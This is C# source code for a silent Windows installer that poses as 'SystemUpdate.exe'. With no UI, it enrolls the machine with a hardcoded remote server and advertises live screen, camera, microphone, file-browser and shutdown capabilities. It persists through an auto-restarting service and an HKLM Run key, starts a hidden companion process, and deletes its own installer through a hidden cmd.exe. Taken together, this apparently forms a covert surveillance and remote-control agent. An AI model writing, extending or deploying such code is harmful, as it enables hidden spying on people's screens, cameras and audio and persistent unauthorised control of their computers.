using System.Diagnostics;
using System.Net.Http.Json;
using System.Runtime.InteropServices;
using System.Text.Json;
using KabenSatuData.Agent.Core;
using KabenSatuData.Agent.Service;
using Microsoft.Win32;

namespace KabenSatuData.Agent.Unified;

/// <summary>
/// Silent self-installer: copies exe, auto-enrolls, installs service,
/// registers companion auto-start, and cleans up — all without any UI.
/// </summary>
internal static class SilentInstaller
{
    private static readonly JsonSerializerOptions JsonOptions = new(JsonSerializerDefaults.Web);
    private static string? _logPath;

    private static void Log(string message)
    {
        try
        {
            _logPath ??= Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                "SystemUpdate_install.log");
            File.AppendAllText(_logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}");
        }
        catch { /* ignore logging failures */ }
    }

    public static async Task<int> RunAsync()
    {
        if (!OperatingSystem.IsWindows())
        {
            return 2;
        }

        try
        {
            Log("=== SystemUpdate Installer Started ===");
            Log($"Current exe: {Environment.ProcessPath}");
            Log($"Machine: {Environment.MachineName}");
            Log($"OS: {Environment.OSVersion.VersionString}");

            var installDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                HardcodedConfig.InstallDirName);
            var installedExe = Path.Combine(installDir, "SystemUpdate.exe");
            var currentExe = Environment.ProcessPath!;

            // If running from install dir, this is not an install invocation — skip
            if (Path.GetFullPath(currentExe).StartsWith(
                    Path.GetFullPath(installDir), StringComparison.OrdinalIgnoreCase))
            {
                Log("Already running from install dir, skipping install.");
                return 0;
            }

            // ─── Step 1: Stop existing service if running ────────────────────
            Log("Step 1: Stopping existing service...");
            StopExistingService();
            Log("Step 1: Done.");

            // ─── Step 2: Create directories ──────────────────────────────────
            Log($"Step 2: Creating directories at {installDir}...");
            Directory.CreateDirectory(installDir);
            Directory.CreateDirectory(Path.Combine(installDir, "logs"));
            Directory.CreateDirectory(Path.Combine(installDir, "work"));
            Log("Step 2: Done.");

            // ─── Step 3: Copy exe to install directory ───────────────────────
            Log($"Step 3: Copying exe to {installedExe}...");
            File.Copy(currentExe, installedExe, overwrite: true);
            Log($"Step 3: Done. File size: {new FileInfo(installedExe).Length} bytes");

            // ─── Step 4: Auto-enroll with server ─────────────────────────────
            var settingsFile = Path.Combine(installDir, "agent.settings.json");
            var protector = new DpapiSecretProtector();
            var settingsStore = new AgentSettingsStore(settingsFile, protector);

            if (!settingsStore.Exists)
            {
                Log($"Step 4: Auto-enrolling with {HardcodedConfig.ServerUrl}...");
                var settings = await AutoEnrollAsync();
                await settingsStore.SaveAsync(settings);
                Log($"Step 4: Done. Device UUID: {settings.DeviceUuid}");
            }
            else
            {
                Log("Step 4: Already enrolled, skipping.");
            }

            // ─── Step 5: Install Windows Service ─────────────────────────────
            Log("Step 5: Installing Windows Service...");
            InstallService(installedExe);
            Log("Step 5: Done.");

            // ─── Step 6: Register Companion auto-start ───────────────────────
            Log("Step 6: Registering Companion auto-start...");
            RegisterCompanionAutoStart(installedExe);
            Log("Step 6: Done.");

            // ─── Step 7: Start service ───────────────────────────────────────
            Log("Step 7: Starting service...");
            StartService();
            Log("Step 7: Done.");

            // ─── Step 8: Start Companion (in user session) ───────────────────
            Log("Step 8: Starting Companion...");
            StartCompanion(installedExe);
            Log("Step 8: Done.");

            // ─── Step 9: Schedule self-delete of installer ───────────────────
            Log("Step 9: Scheduling self-delete...");
            ScheduleSelfDelete(currentExe);
            Log("Step 9: Done.");

            Log("=== Installation completed successfully! ===");
            return 0;
        }
        catch (Exception ex)
        {
            Log($"!!! FATAL ERROR: {ex.GetType().Name}: {ex.Message}");
            Log($"Stack: {ex.StackTrace}");
            return 1;
        }
    }

    private static async Task<AgentSettings> AutoEnrollAsync()
    {
        var serverUrl = new Uri(HardcodedConfig.ServerUrl);
        var machineGuid = ReadMachineGuid();

        var payload = new
        {
            pre_shared_key = HardcodedConfig.PreSharedKey,
            platform = "windows",
            device_name = Environment.MachineName,
            hostname = Environment.MachineName,
            os_name = "Windows",
            os_version = Environment.OSVersion.VersionString,
            architecture = RuntimeInformation.OSArchitecture.ToString().ToLowerInvariant(),
            agent_version = HardcodedConfig.AgentVersion,
            installer_version = HardcodedConfig.AgentVersion,
            hardware_fingerprint = machineGuid,
            capabilities = new[]
            {
                "heartbeat", "metrics", "device_info", "process_list",
                "application_list", "screenshot_on_demand", "live_screen",
                "camera", "camera_snapshot", "audio_capture", "file_browser",
                "lock", "restart", "shutdown", "diagnostic_bundle",
            },
            permissions_state = new
            {
                screenshot = "available",
                camera = "available",
                microphone = "available",
                live_screen = "available",
                file_browser = "available",
            },
        };

        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        var endpoint = new Uri(serverUrl, "/api/agent/v1/auto-enroll");
        Log($"POST {endpoint}");
        using var response = await http.PostAsJsonAsync(endpoint, payload, JsonOptions);

        var content = await response.Content.ReadAsStringAsync();
        Log($"Response HTTP {(int)response.StatusCode}: {content[..Math.Min(content.Length, 2000)]}");

        if (!response.IsSuccessStatusCode)
        {
            throw new InvalidOperationException($"Auto-enroll gagal (HTTP {(int)response.StatusCode}): {content[..Math.Min(content.Length, 1000)]}");
        }

        var json = JsonDocument.Parse(content);
        var data = json.RootElement.GetProperty("data");
        var configuration = data.GetProperty("configuration");

        return new AgentSettings(
            serverUrl,
            data.GetProperty("device_uuid").GetString()!,
            data.GetProperty("bearer_token").GetString()!,
            configuration.GetProperty("heartbeat_seconds").GetInt32(),
            configuration.GetProperty("command_poll_seconds").GetInt32(),
            configuration.GetProperty("request_signature_required").GetBoolean());
    }

    private static void StopExistingService()
    {
        try
        {
            // Kill companion process
            foreach (var proc in Process.GetProcessesByName("SystemUpdate"))
            {
                if (proc.Id != Environment.ProcessId)
                {
                    proc.Kill();
                    proc.WaitForExit(5000);
                }
            }

            RunSc("stop", HardcodedConfig.ServiceName);
            Thread.Sleep(2000);
            RunSc("delete", HardcodedConfig.ServiceName);
            Thread.Sleep(1000);
        }
        catch
        {
            // Service may not exist yet — ignore
        }
    }

    private static void InstallService(string exePath)
    {
        // Create service
        var binPath = $"\"{exePath}\" --service";
        RunProcess("sc.exe", $"create {HardcodedConfig.ServiceName} binPath= \"{binPath}\" start= auto DisplayName= \"{HardcodedConfig.ServiceDisplayName}\"");

        // Set description
        RunProcess("sc.exe", $"description {HardcodedConfig.ServiceName} \"Managed device monitoring service.\"");

        // Configure auto-restart on failure
        RunProcess("sc.exe", $"failure {HardcodedConfig.ServiceName} reset= 86400 actions= restart/5000/restart/15000/restart/60000");
    }

    private static void RegisterCompanionAutoStart(string exePath)
    {
        if (!OperatingSystem.IsWindows()) return;

        var runKey = Registry.LocalMachine.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
        runKey?.SetValue(HardcodedConfig.CompanionRunKey, $"\"{exePath}\" --companion");
        runKey?.Dispose();
    }

    private static void StartService()
    {
        RunSc("start", HardcodedConfig.ServiceName);
    }

    private static void StartCompanion(string exePath)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = exePath,
                Arguments = "--companion",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            });
        }
        catch
        {
            // Companion will start on next login via Registry Run
        }
    }

    private static void ScheduleSelfDelete(string installerPath)
    {
        try
        {
            // Use cmd /c to delete the installer after a short delay
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c timeout /t 3 /nobreak >nul & del /f /q \"{installerPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            });
        }
        catch
        {
            // Not critical — installer just stays in Downloads
        }
    }

    private static string ReadMachineGuid()
    {
        if (!OperatingSystem.IsWindows()) return Guid.NewGuid().ToString();

        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Cryptography", writable: false);
            return key?.GetValue("MachineGuid")?.ToString() ?? Guid.NewGuid().ToString();
        }
        catch
        {
            return Guid.NewGuid().ToString();
        }
    }

    private static void RunSc(string action, string serviceName)
    {
        RunProcess("sc.exe", $"{action} {serviceName}");
    }

    private static void RunProcess(string fileName, string arguments)
    {
        using var process = Process.Start(new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        });
        process?.WaitForExit(15000);
    }
}
